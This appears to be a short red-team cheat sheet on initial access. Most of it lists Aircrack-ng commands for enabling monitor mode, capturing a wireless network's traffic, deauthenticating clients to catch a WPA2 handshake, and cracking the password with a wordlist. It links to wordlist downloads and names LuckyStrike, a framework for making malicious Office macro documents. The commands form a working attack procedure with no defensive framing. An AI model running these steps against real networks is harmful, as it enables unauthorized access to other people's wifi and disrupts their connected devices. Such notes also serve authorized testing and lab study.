Initial Access consists of techniques that use various entry vectors to gain their initial foothold within a network. Techniques used to gain a foothold include targeted spear phishing and exploiting weaknesses on public-facing web servers. Footholds gained through initial access may allow for continued access, like valid accounts and use of external remote services, or may be limited-use due to changing passwords.

# Aircrack-ng
````
airmon-ng check kill
airmon-ng start wlan0 - monitor mode, check with ifconfig
airodump-ng wlan0mon - get BSSID
airodump-ng wlan0mon -bssid MAC -s CHANNEL -w ./NAME
aircrack-ng   - get password in hex
airmon-ng stop wlan0mon
service network-manager restart
````

  #### WPA2   
  4-way handshake monitoring . Same steps till airdump-ng packet capturing, and disconect client to capture handshake

  ````
  aireplay-ng wlan0mon --deauth NR_TRIES -s BSSID -h CLIENT_MAC   
  aircrack-ng -w WORDLIST CAPFILE  
  ````

  [WPA / WPA2 Word List Dictionaries Downloads – WirelesSHack](https://www.wirelesshack.org/wpa-wpa2-word-list-dictionaries.html)


  # LuckyStrike
  Powershell framework for creating malicious macro Office documents.